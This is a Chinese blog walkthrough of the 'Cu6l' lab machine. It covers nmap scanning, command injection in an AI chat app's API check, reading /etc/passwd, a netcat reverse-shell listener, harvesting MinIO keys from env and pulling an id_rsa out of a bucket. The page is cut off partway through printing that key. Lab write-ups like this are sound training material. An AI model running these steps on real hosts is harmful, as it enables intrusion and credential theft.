@@ -1,0 +1,782 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Miao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机来源：QQ群-660930334 难度：Easy">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mazesec_Cu6l">
+<meta property="og:url" content="http://miao-sec.github.io/Maze-sec/Mazesec-Cu6l/index.html">
+<meta property="og:site_name" content="Miao Blog">
+<meta property="og:description" content="靶机来源：QQ群-660930334 难度：Easy">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202602281508796.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202602281509023.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202602281539929.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202602281540567.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202602281542522.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202602281548999.png">
+<meta property="article:published_time" content="2026-02-28T06:32:06.000Z">
+<meta property="article:modified_time" content="2026-03-11T06:34:31.709Z">
+<meta property="article:author" content="Miao">
+<meta property="article:tag" content="curl">
+<meta property="article:tag" content="Env">
+<meta property="article:tag" content="Minio">
+<meta property="article:tag" content="id_rsa_burf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202602281508796.png">
+  
+  
+  
+  <title>Mazesec_Cu6l - Miao Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassBg.css">
+<link rel="stylesheet" href="/css/macBorder.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"miao-sec.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"#"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":"flase"},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"W5UPQ7BHtxFTBIoh5xr1UWMt-gzGzoHsz","app_key":"WEHCtPWZ5dJRfC1hhVipHKwQ","server_url":"https://w5upq7bh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav
+  id="navbar"
+  class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"
+>
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"
+        >Miaosec</strong
+      >
+    </a>
+
+    <button
+      id="navbar-toggler-btn"
+      class="navbar-toggler"
+      type="button"
+      data-toggle="collapse"
+      data-target="#navbarSupportedContent"
+      aria-controls="navbarSupportedContent"
+      aria-expanded="false"
+      aria-label="Toggle navigation"
+    >
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+            
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/"
+            target="_self"
+          >
+            <i class="iconfont icon-home-fill"></i>
+            <span>首页</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/archives/"
+            target="_self"
+          >
+            <i class="iconfont icon-archive-fill"></i>
+            <span>归档</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/categories/"
+            target="_self"
+          >
+            <i class="iconfont icon-category-fill"></i>
+            <span>分类</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/tags/"
+            target="_self"
+          >
+            <i class="iconfont icon-tags-fill"></i>
+            <span>标签</span>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="search-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            data-toggle="modal"
+            data-target="#modalSearch"
+            aria-label="Search"
+          >
+            <i class="iconfont icon-search"></i>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="color-toggle-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            aria-label="Color Toggle"
+          >
+            <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+          </a>
+        </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Mazesec_Cu6l"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-02-28 14:32" pubdate>
+          2026年2月28日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          9 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Mazesec_Cu6l</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>靶机来源：QQ群-<code>660930334</code></p>
+<p>难度：Easy</p>
+<span id="more"></span>
+
+<h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap -sn 192.168.2.0/24                                  <br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-28 15:04 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00077s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00098s latency).<br>MAC Address: 08:00:27:CF:79:5A (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> cu6l.dsz (192.168.2.76)<br>Host is up (0.0014s latency).<br>MAC Address: 08:00:27:AE:60:51 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 8.49 seconds<br></code></pre></td></tr></table></figure>
+
+<p>靶机IP：<code>192.168.2.76</code></p>
+<h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.76                   <br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-28 15:05 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> cu6l.dsz (192.168.2.76)<br>Host is up (0.00093s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:AE:60:51 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 34.73 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开放端口：<code>22、80</code></p>
+<h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap --min-rate 10000 -sT -sC -sV -O -p22,80 192.168.2.76<br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-28 15:06 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> cu6l.dsz (192.168.2.76)<br>Host is up (0.00081s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    nginx 1.18.0<br>|_http-server-header: nginx/1.18.0<br>|_http-title: AI Chat Web Application<br>MAC Address: 08:00:27:AE:60:51 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose|router<br>Running: Linux 4.X|5.X, MikroTik RouterOS 7.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3<br>OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.91 seconds<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap -sU --top-ports 100 192.168.2.76                    <br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-28 15:07 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> cu6l.dsz (192.168.2.76)<br>Host is up (0.0013s latency).<br>Not shown: 99 closed udp ports (port-unreach)<br>PORT   STATE         SERVICE<br>68/udp open|filtered dhcpc<br>MAC Address: 08:00:27:AE:60:51 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 108.23 seconds<br></code></pre></td></tr></table></figure>
+
+<h1 id="二、WEN渗透"><a href="#二、WEN渗透" class="headerlink" title="二、WEN渗透"></a>二、WEN渗透</h1><h2 id="1、HTTP-服务枚举"><a href="#1、HTTP-服务枚举" class="headerlink" title="1、HTTP 服务枚举"></a>1、HTTP 服务枚举</h2><p>访问80端口，提示需要使用域名<code>cu6l.dsz</code>进行访问 <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202602281508796.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
+<p>配置域名解析</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;192.168.2.76 cu6l.dsz&quot;</span> &gt;&gt; /etc/hosts<br></code></pre></td></tr></table></figure>
+
+<p>访问<code>cu6l.dsz</code> <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202602281509023.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
+<h1 id="三、命令执行"><a href="#三、命令执行" class="headerlink" title="三、命令执行"></a>三、命令执行</h1><p>添加API配置信息，在验证当前API时抓包查看，发现可以执行命令 <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202602281539929.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
+<p>成功执行访问<code>http://127.0.0.1</code> <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202602281540567.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
+<p>尝试读取<code>/etc/passwd</code>，成功进行读取 <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202602281542522.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
+<p>反弹shell <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202602281548999.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
+<p>成功获取到shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.76] 57974<br><span class="hljs-built_in">id</span><br>uid=1001(yliken) gid=1001(yliken) <span class="hljs-built_in">groups</span>=1001(yliken)<br></code></pre></td></tr></table></figure>
+
+<p>稳定shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/bin/script -qc /bin/bash /dev/null<br><span class="hljs-comment"># 按下 Ctrl+Z 将其挂起</span><br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br><span class="hljs-comment"># 按下回车</span><br>reset xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> SHELL=/bin/bash<br><span class="hljs-built_in">stty</span> rows 24 columns 80<br></code></pre></td></tr></table></figure>
+
+<h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><p>查看<code>env</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">yliken@cu6l:~$ <span class="hljs-built_in">env</span><br>SHELL=/bin/bash<br>MINIO_SECRET_KEY=dszminioadmin-01<br>PWD=/home/yliken<br>LOGNAME=yliken<br>MINIO_SECURE=<span class="hljs-literal">false</span><br>HOME=/home/yliken<br>LANG=en_US.UTF-8<br>MINIO_BUCKET_NAME=avatars<br>LS_COLORS=<br>INVOCATION_ID=c24133dbd4bf480c96ca3e6fe56d5354<br>MINIO_ENDPOINT=127.0.0.1:9000<br>WERKZEUG_SERVER_FD=4<br>USER=yliken<br>SHLVL=1<br>JOURNAL_STREAM=9:13409<br>MINIO_ACCESS_KEY=dszminioadmin<br>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>_=/usr/bin/env<br>OLDPWD=/home<br></code></pre></td></tr></table></figure>
+
+<p>找到minio的SECRET_KEY和ACCESS_KEY</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">MINIO_SECRET_KEY=dszminioadmin-01<br>MINIO_BUCKET_NAME=avatars<br>MINIO_ACCESS_KEY=dszminioadmin<br></code></pre></td></tr></table></figure>
+
+<p>minio提供了命令管理工具<code>mc</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://dl.min.io/client/mc/release/linux-amd64/mc<br></code></pre></td></tr></table></figure>
+
+<p>配置minio服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">yliken@cu6l:/tmp$ ./mc <span class="hljs-built_in">alias</span> <span class="hljs-built_in">set</span> myminio http://127.0.0.1:9000 dszminioadmin dszminioadmin-01<br>mc: Configuration written to `/home/yliken/.mc/config.json`. Please update your access credentials.<br>mc: Successfully created `/home/yliken/.mc/share`.<br>mc: Initialized share uploads `/home/yliken/.mc/share/uploads.json` file.<br>mc: Initialized share downloads `/home/yliken/.mc/share/downloads.json` file.<br>Added `myminio` successfully.<br></code></pre></td></tr></table></figure>
+
+<p>读取</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">yliken@cu6l:/tmp$ ./mc <span class="hljs-built_in">ls</span> myminio<br>[2026-02-06 04:47:44 EST]     0B avatars/<br>[2026-02-06 05:05:20 EST]     0B mysecret/<br><br>yliken@cu6l:/tmp$ ./mc <span class="hljs-built_in">ls</span> myminio/mysecret/ <br>[2026-02-06 05:05:34 EST] 3.3KiB STANDARD id_rsa<br></code></pre></td></tr></table></figure>
+
+<p>复制<code>id_rsa</code>到当前目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">yliken@cu6l:/tmp$ ./mc <span class="hljs-built_in">cp</span> myminio/mysecret/id_rsa ./<br>...ret/id_rsa: 3.33 KiB / 3.33 KiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 286.34 KiB/s 0syliken@cu6l:/tmp$ <span class="hljs-built_in">ls</span> -la<br></code></pre></td></tr></table></figure>
+
+<p>查看<code>id_rsa</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">yliken@cu6l:/tmp$ <span class="hljs-built_in">cat</span> id_rsa <br>-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDqdG+Rw+<br>SwQdFt+6iJVQ9qAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDXoperE7aZ<br>3401sQEBhIPHaREv3Dbk0/Hn9EiVKRObCSPQxzeNozcqDlPaJHOZXpSzrtX2gyYaF9LIDO<br>p3Ho3mD5mUKnpCmrIsZAv90SVayKcarG+/7yKwSV9ZVSiaBCgH4s4MhrXTrx+xx98XXlaJ<br>e1eDpYlwHmZSFKJszM5ntWIIXQEw08R1HLnlvWGk0bWdvE4btQPOEdiPoocEAYEjyXIrPQ<br>7pN7JPnN7YbCaOvavrs3F8Myk4wZ5OnHk9QV8dI8a/ioxCKpQAzLDX/QVfJUbqULtkt8eM<br>uEAqmcuUvXoHZUtg6B4nJVls7kFe4UG4PQiLHEED+T07P0bBXMsvnenhKmbVOFIEUglx8z<br>Y4NtlMfLc6vksDSW2exHIwwK5GHw5ZabQGt2AQQU4lt8aLy7+OOr0mqG36rkM7UV/LZYcy<br>5CgJjbBsXkfuDN0uXa30B0cguPh83ZAXVPrUk8VD1rM+AcpL7xoV7oA/edpL4Er+lGE3tT<br>49ot6taPuL0kn+HNuT/ec6iFQf+9IDqKvkHTEsL7ZplPlVGv5Q/aLtiiVpQzZS1iZ/rLix<br>P3ecHmKD8cBgOFo2I64/B+6YxATwZkHmr/p9p+m+m0ThBjw1PPLj8hoJ1qPEiz6nsCgYQk<br>HWJaq9NuS3PARodb9PMn8nBsyZM/+VChiR3+JBq3HFYwAAB0CNHM9qbVgeW1H5215ptL+n<br>A6vN5PGaw0HIzoifrVNLc0vpDlbUPyV8KOp7PE6ObpA8dxlUSSMhnmR+Cer0EcMWN2/idW<br>hvq24WL9MJke9BrpDFWWTQ5l5z/n+tQWRACUpw+Yhoja4zHoievNkObFoV2fyCG585CN4t<br>DxhyU5wA2Q1lqw4u3J95+JilXU1vILwu9B4UusWIO5WWkmDtIUqVGFFnsJparjN4kcIooN<br>//CX6fVKsiUHmeAaaLQycOvvioPVuOQky7t5FV+zSdwqEqHXAnwxCDOawSqIgzSoFIa9pD<br>9YbQ7JpI7jw38PJhCPdMBLZUOufukkE7AAVSdxWdat661h7akYvia02B1+g/IGJIgpjKCw<br>60z4hfPEHhsYbB6Xmke9e3x6pbwFIGj4RUVDZS0L5DUC9XRq5E27Rv6nxeBwgGSLWyuwTX<br>PJlBhxunUTYUUH9QGlUIr+LqKTZLEG4bQaFteKFrjxXMnJtHKEcWL+N+QHxdgiw+oyx2Ha<br>uc8ygmbN7Hb8e23tP53IJ1Rihtmiyt0vpl0qQ85NM9++m22okr6x5sROESyFUR5ltW8Myw<br>XjAj3sNFlNczrkFkD9+OYvlHDyQk2STGvEP715MOpgNNYBKHs49vzShamhtNJlHrUTl9VA<br>Ss+Rs49nUquEwtavWpQUJAqR1zdzOZI+qAKC55xQQrMNaWybYxQsBFCanFth6Of1w4RSnV<br>HLXuENQtPXF0CwBYqT7hDXlCTJ3j+0k2Io/GyDvPoZ8PQGO8h32aB8Pl0ZgaQrSsjmDFka<br>tUdpi4EPbq75b8OdWXEq0kROup2uzyaU26nD3m3IaCclKt9XoAfsf/IdiYDikNMKXm82Zl<br>HP3y5i6BhQqRXUEBZuaKRBCgqsGLeJHWyEeZ3QdxjXGuBPG0R0mvpuUtT7bUaZJSKo2iUt<br>ZmmGK8mer8XY5tME6VZvYh3D0TRTgZ/BFrWwn/KXiKP7leJUanQmWGv8ox3JJNNE2+r+S4<br>IL1OWwaebettyGh2Fo5W8hjU3r9PpHt5Db0t1h1MKtvfguZKR3oIpC8m2mrIDnV7rBvSRr<br>6kezB9+OzasxgZeYErkCSBQOY/g2j1iXv+V6yXEfhHixBfI3K+n0rwULAG57BwD3I5bgBZ<br>134Q1ZrKSswcIiEsXZ0uH5wCayEYP4/X4M8sY/cIfFjO9h5c8R/VtJSiBr67cm+LsdMLPt<br>q66GyBrjyzxktLhl3FIT5MmO30F3EYuf2OPJeW6YkAc+UAq4r6ctsAgfJhQ6HVW+Xk5Ce2<br>M/BP2i9DAiyuHa4Qiqint1qisd6LjsoEd8R1DYYFOUn0SyBFevp7CjDhQcg04VIQM2zWRu<br>tcaWS2D89KVcvals/kY1rUf9Vuk4hfmxUGK8Q0QailNoWOAdGO6fRKzatwQCzFLDYnKsD/<br>+u7KVrZ68sxvTMCMXw9Lj7siJVjzuILZBrTACX0J46xF2ANCalLOYefTfhJidKwPu30Mcz<br>